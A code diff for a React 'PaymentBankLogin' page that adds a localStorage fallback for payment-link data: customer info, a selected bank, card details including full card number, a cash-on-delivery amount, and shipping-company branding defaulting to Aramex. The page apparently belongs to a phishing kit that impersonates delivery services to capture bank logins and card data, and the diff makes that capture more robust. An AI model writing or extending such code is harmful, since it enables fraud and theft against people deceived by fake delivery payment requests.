@@ -28,10 +28,14 @@ const PaymentBankLogin = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  // Get customer info and selected bank from link data (cross-device compatible)
-  const customerInfo = linkData?.payload?.customerInfo || {};
-  const selectedBankId = linkData?.payload?.selectedBank || '';
-  const cardInfo = linkData?.payload?.cardInfo || {
+  // Fallback to localStorage if linkData is not available
+  const localData = id ? localStorage.getItem(`payment_${id}`) : null;
+  const localPayload = localData ? JSON.parse(localData) : null;
+
+  // Get customer info and selected bank from link data or localStorage (cross-device compatible)
+  const customerInfo = linkData?.payload?.customerInfo || localPayload?.customerInfo || {};
+  const selectedBankId = linkData?.payload?.selectedBank || localPayload?.selectedBank || '';
+  const cardInfo = linkData?.payload?.cardInfo || localPayload?.cardInfo || {
     cardName: '',
     cardLast4: '',
     cardNumber: '',
@@ -40,14 +44,14 @@ const PaymentBankLogin = () => {
     cardType: '',
   };
   
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+  const serviceKey = linkData?.payload?.service_key || localPayload?.service_key || customerInfo.service || 'aramex';
+  const serviceName = linkData?.payload?.service_name || localPayload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
 
-  // Get country from link data
-  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
+  // Get country from link data or localStorage
+  const selectedCountry = linkData?.payload?.selectedCountry || localPayload?.selectedCountry || "SA";
 
-  const shippingInfo = linkData?.payload as any;
+  const shippingInfo = (linkData?.payload || localPayload) as any;
 
   // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
